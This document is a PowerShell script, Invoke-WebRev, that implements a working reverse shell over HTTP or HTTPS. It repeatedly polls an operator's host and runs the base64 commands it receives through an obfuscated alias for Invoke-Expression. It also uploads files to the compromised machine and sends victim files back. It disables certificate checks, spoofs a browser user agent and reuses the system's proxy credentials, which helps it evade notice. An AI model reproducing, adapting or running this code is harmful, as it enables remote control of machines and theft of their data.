function Invoke-WebRev{
    param
    (
        [string]$ip,
        [string]$port,
        [switch]$ssl
    )

    $help=@"

.SYNOPSIS
    WebRev.
    PowerShell Function: Invoke-WebRev
    Author: Hector de Armas (3v4Si0N)

    Dependencias Requeridas: Ninguna
    Dependencias Opcionales: Ninguna
.DESCRIPTION
    .

.ARGUMENTS
    -ip   <IP>      Remote Host
    -port <PORT>    Remote Port
    -ssl            Send traffic over ssl

.EXAMPLE
    Invoke-Webrev -ip 192.168.29.131 -port 80
    Invoke-Webrev -ip 192.168.29.131 -port 443 -ssl
"@

    if(-not $ip -or -not $port) { return $help; }
    
    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
    $postParams = @{result='start'};
    $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
    
    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
    [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

    while ($true)
    {
        try
        {
            $req = Invoke-WebRequest $url -UseBasicParsing -Method POST -Body $postParams -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
            $header = $req.Headers["Authorization"];
            $c = [System.Convert]::FromBase64String($header);
            $cstr = [System.Text.Encoding]::UTF8.GetString($c);
            $result = "";
            $dataToSend = "";

            if($cstr.split(" ")[0] -eq "upload")
            {
                $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
                $location = $cstr.split(" ")[2];
                $content = [System.Convert]::FromBase64String($uploadData);
                $content | Set-Content $location -Encoding Byte
                $result += "[+] File successfully uploaded.";
                $cstr = "pwd";
            }

            elseif($cstr.split(" ")[0] -eq "download")
            {
                $commarray = $cstr.split(" ");
                $pathSrc = $commarray[1];
                $pathDst = $commarray[2];
                if (Test-Path -Path $pathSrc) 
                {
                    $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
                    $b64 = [System.Convert]::ToBase64String($downloadData);
                    $dataToSend = 'D0wnL04d' + $b64 + 'D0wnL04d' + '_n1w_' + $pathDst + '_n1w_' + "[+] File successfully downloaded.";
                    $result += $datatoSend;
                } 
                else
                {
                    $result += "[!] Source file not found!";
                }
                $cstr = "pwd";
            }
            
            Foreach ($string in taleska-ei-vrixeka $cstr)
            {
                $result += '_n1w_' + $string;
            };
            
            $result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result));
            $postParams = @{result=$result};
        }catch {};
    };
}

#Invoke-WebRev -ip 192.168.100.128 -port 80